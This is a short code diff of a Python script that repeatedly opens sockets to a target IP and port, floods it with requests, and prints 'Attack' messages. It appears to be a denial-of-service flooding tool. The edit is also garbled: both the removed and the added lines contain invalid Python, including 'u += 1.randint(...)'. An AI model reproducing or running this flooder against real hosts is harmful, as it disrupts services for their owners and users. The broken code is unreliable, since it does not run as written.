@@ -82,10 +82,9 @@ def start():
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             s.connect((str(ip),int(port)))
             s.send(str.encode(main_req))
-            for {i} in range(pack):
+            for i in range(pack):
                 s.send(str.encode(main_req))
-            xx += random.randint(0, int(pack))
-                u += 1
+            u += 1.randint(0, int(pack))
             print("\033[33m[\033[1m+\033[33m]\033[92mKoma Stars  " +str(u)+ "  \033[33mAttack \033[97m::." +ip+ "\033[0m.")
         except:
             s.close()
